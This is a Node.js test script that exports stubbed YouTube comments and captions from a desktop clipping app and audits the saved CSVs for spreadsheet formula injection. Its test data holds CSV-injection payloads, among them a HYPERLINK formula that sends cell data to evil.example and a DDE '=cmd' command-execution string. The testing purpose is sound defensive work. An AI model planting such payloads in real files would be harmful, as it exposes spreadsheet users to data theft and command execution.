#!/usr/bin/env node
/**
 * t9-csv-app.cjs — E-7 in the running app: comment text and caption text
 * written by strangers, exported for real, and read back out of the folder the
 * app saved, with an RFC 4180 parser written from the spec.
 *
 * usage: xvfb-run -a ... node t9-csv-app.cjs <shape>
 */
const fs = require("node:fs");
const path = require("node:path");
const { launch, stubRoot, setStub, save, sleep } = require("./lib.cjs");

const SHAPE = process.argv[2] || "owner-hash";
const FORMULA_FIRST = /^[=+\-@\t\r\n]/;

const COMMENTS = [
  "=cmd reply",
  '=HYPERLINK("http://evil.example/?x="&A1,"click")',
  "+1+1",
  "-2-2",
  "@SUM(1:1)",
  "=cmd|' /C calc'!A1",
  'Comma, then "quoted", then 🎬 שלום עולם',
  "-5",
];
const VTT =
  "WEBVTT\n\n00:00:00.000 --> 00:00:02.000\n=1+1, \"quoted\" caption 🎬 עברית\n\n00:00:02.000 --> 00:00:04.000\n@SUM(A1:A9)\n";

function parseCsv(text) {
  let s = text;
  if (s.charCodeAt(0) === 0xfeff) s = s.slice(1);
  const rows = [];
  let row = [];
  let field = "";
  let i = 0;
  let quoted = false;
  while (i < s.length) {
    const c = s[i];
    if (quoted) {
      if (c === '"') {
        if (s[i + 1] === '"') { field += '"'; i += 2; continue; }
        quoted = false; i += 1; continue;
      }
      field += c; i += 1; continue;
    }
    if (c === '"' && field === "") { quoted = true; i += 1; continue; }
    if (c === ",") { row.push(field); field = ""; i += 1; continue; }
    if (c === "\r" && s[i + 1] === "\n") { row.push(field); rows.push(row); row = []; field = ""; i += 2; continue; }
    if (c === "\n") { row.push(field); rows.push(row); row = []; field = ""; i += 1; continue; }
    field += c; i += 1;
  }
  if (field !== "" || row.length) { row.push(field); rows.push(row); }
  return rows;
}

function auditFolder(dir) {
  const report = {};
  for (const name of fs.readdirSync(dir)) {
    const raw = fs.readFileSync(path.join(dir, name), "utf8");
    const parsed = parseCsv(raw);
    const header = parsed[0] || [];
    const formulaCells = [];
    parsed.forEach((r, ri) =>
      r.forEach((cell, ci) => {
        if (FORMULA_FIRST.test(cell) && !/^[+-]?\d+(?:\.\d+)?$/.test(cell))
          formulaCells.push({ row: ri, column: header[ci], firstChar: JSON.stringify(cell[0]), value: cell.slice(0, 60) });
      }),
    );
    report[name] = {
      bytes: raw.length,
      bom: raw.charCodeAt(0) === 0xfeff,
      crlf: raw.includes("\r\n"),
      header,
      dataRows: parsed.length - 1,
      ragged: parsed.filter((r) => r.length !== header.length).length,
      formulaCells,
      neutralisedCells: parsed.flat().filter((c) => c.startsWith("'")).length,
      sampleTextCells: (() => {
        const ti = header.indexOf("text");
        return ti < 0 ? null : parsed.slice(1, 12).map((r) => r[ti]);
      })(),
    };
  }
  return report;
}

(async () => {
  const report = { shape: SHAPE, startedAt: new Date().toISOString(), payloads: COMMENTS, vtt: VTT };
  const root = stubRoot("t9");
  setStub(root, { videos: 5, commentTexts: COMMENTS, vttText: VTT, channelName: 'Evil, "Channel" 🎬' });
  const dataDir = fs.mkdtempSync("/tmp/r2e-data-t9-");
  const clipsDir = fs.mkdtempSync("/tmp/r2e-clips-t9-");

  const a = await launch({
    shape: SHAPE,
    label: `t9-${SHAPE}`,
    cwd: root,
    seed: { "clipper.dataDir": dataDir, "clipper.dataDirConfirmed": true, "clipper.clipsDir": clipsDir, "clipper.saveDir": clipsDir },
  });
  try {
    await a.win.waitForSelector("header", { timeout: 30000 });
    const skip = a.win.locator('button:has-text("Continue without signing in")');
    if (await skip.count()) await skip.first().click().catch(() => {});
    await sleep(800);
    await a.win.click("#ui-channel-link");
    await a.win.waitForSelector("#ui-channel-start", { timeout: 20000 });
    await a.win.fill('input[placeholder="https://www.youtube.com/@channelhandle"]', "https://www.youtube.com/@evilchannel");
    await a.win.fill('input[type="number"]', "10");
    await a.win.click("#ui-channel-start");

    const dl = Date.now() + 120000;
    while (Date.now() < dl) {
      const s = await a.win.evaluate(() => ({
        running: Boolean(document.getElementById("ui-channel-stop")),
        text: document.body.innerText.slice(0, 2000),
      }));
      if (!s.running && /Export saved|Partial export saved|role="alert"/.test(s.text)) break;
      if (!s.running && document) {
        const alert = await a.win.evaluate(() => {
          const el = document.querySelector('[role="alert"]');
          return el ? el.textContent : null;
        });
        if (alert) { report.alert = alert; break; }
        if (/Export saved/.test(s.text)) break;
      }
      await sleep(250);
    }
    await a.shot("01-export-done");
    report.folders = fs.readdirSync(dataDir);
    report.audit = {};
    for (const f of report.folders) report.audit[f] = auditFolder(path.join(dataDir, f));
    // keep the bytes
    const ev = path.join(__dirname, "out", "csv-evidence-app");
    fs.rmSync(ev, { recursive: true, force: true });
    for (const f of report.folders) {
      fs.mkdirSync(path.join(ev, f), { recursive: true });
      for (const n of fs.readdirSync(path.join(dataDir, f)))
        fs.copyFileSync(path.join(dataDir, f, n), path.join(ev, f, n));
    }
  } catch (e) {
    report.fatal = String(e && e.stack ? e.stack : e);
  } finally {
    save(`t9-${SHAPE}.json`, report);
    await a.close();
  }
})();
